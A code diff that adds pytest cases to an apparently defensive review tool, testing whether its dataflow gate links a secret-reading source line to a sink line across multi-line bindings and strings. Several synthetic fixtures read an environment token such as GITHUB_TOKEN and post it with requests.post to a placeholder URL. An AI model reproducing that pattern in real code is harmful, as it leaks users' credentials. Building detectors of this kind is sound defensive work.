@@ -1,5 +1,6 @@
 """Spec F §3.3: a malicious verdict stands only on a quoted chain the shown code contains. Synthetic only."""
 import dataclasses
+import json
 
 import pytest
 
@@ -326,4 +327,64 @@ def test_the_walrus_hop_test_still_passes_after_fix_round_2():
 
 
 def test_the_fixture_chain_still_passes_after_fix_round_2():
+    assert chain.gate(_v(), chains.SHOWN) == ""
+
+
+# ---- Fix round 3 (controller rulings: N1 critical, N2 important) ----
+
+def test_multiline_source_binding_reaches_a_far_function_sharing_the_name():
+    # N1: a multi-line call/binding's own first line must not lose all its tokens (round 2's lexical retry did,
+    # for any line that failed to tokenize, regardless of whether a string was involved at all).
+    text = ('import os, requests\ndef a():\n    token = os.environ.get(\n        "GITHUB_TOKEN")\n    return token\n'
+            + "pass\n" * 80 + "def b(token):\n    requests.post(U, data=token)\n")
+    v = _v(chain_source='token = os.environ.get(\n        "GITHUB_TOKEN")', chain_sink="requests.post(U, data=token)")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_one_hop_through_a_multiline_binding_line_still_connects():
+    # N1 (reuses the reviewer's r2e2e.py "one-hop via multi-line bind line" case)
+    text = ('import os, requests\nk = os.environ.get(\n    "K")\n' + "pass\n" * 80
+            + "def g():\n    v = k\n    requests.post(U, json=v)\n")
+    v = _v(chain_source='k = os.environ.get(\n    "K")', chain_sink="requests.post(U, json=v)")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_a_sink_that_opens_a_multiline_string_argument_still_connects():
+    # N1 (reuses the reviewer's r2e2e.py "sink opens multi-line str arg" case)
+    text = ('import os, requests\ntoken = os.getenv("K")\n' + "pass\n" * 80
+            + 'requests.post(U, data=token, headers="""\nX: y\n""")\n')
+    v = _v(chain_source='token = os.getenv("K")', chain_sink='requests.post(U, data=token, headers="""')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_string_content_on_an_assignment_opening_line_is_not_read_as_code():
+    # N2: the round-2 lexical retry, cutting after the first quote run, tokenized STRING CONTENT as code — a
+    # docstring-like assignment's opening line must not stand in as a real sink just because it contains the
+    # sink's literal text as part of the string.
+    text = ('import os, requests\ntoken = os.getenv("K")\n' + "pass\n" * 80
+            + 'HELP = """ requests.post(U, data=token)\nusage\n"""\n')
+    v = _v(chain_source='token = os.getenv("K")', chain_sink='HELP = """ requests.post(U, data=token)')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+
+
+def test_the_round_2_closing_line_case_still_passes_via_tails():
+    # N2 / round 2 regression: now resolved through reviewer's "tails" rather than the deleted lexical retry.
+    text = 'import os, requests\ntoken = os.getenv("K")\nx = foo("""abc\ndef""", requests.post(U, data=token))\n'
+    v = _v(chain_source='token = os.getenv("K")', chain_sink='def""", requests.post(U, data=token))')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_tails_round_trips_and_old_json_without_it_still_loads():
+    text = 'import os, requests\ntoken = os.getenv("K")\nx = foo("""abc\ndef""", requests.post(U, data=token))\n'
+    entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], text), "build", whole=True)
+    assert entry["tails"] == {4: 6}
+    shown = {"a.py": entry}
+    assert reviewer.shown_from_json(reviewer.shown_to_json(shown)) == shown
+
+    old = json.dumps({"setup.py": {"cls": "build", "lines": {"3": chains.SOURCE, "4": chains.SINK},
+                                    "scopes": {"3": "module", "4": "module"}}})
+    assert reviewer.shown_from_json(old) == chains.SHOWN
+
+
+def test_the_fixture_chain_still_passes_after_fix_round_3():
     assert chain.gate(_v(), chains.SHOWN) == ""
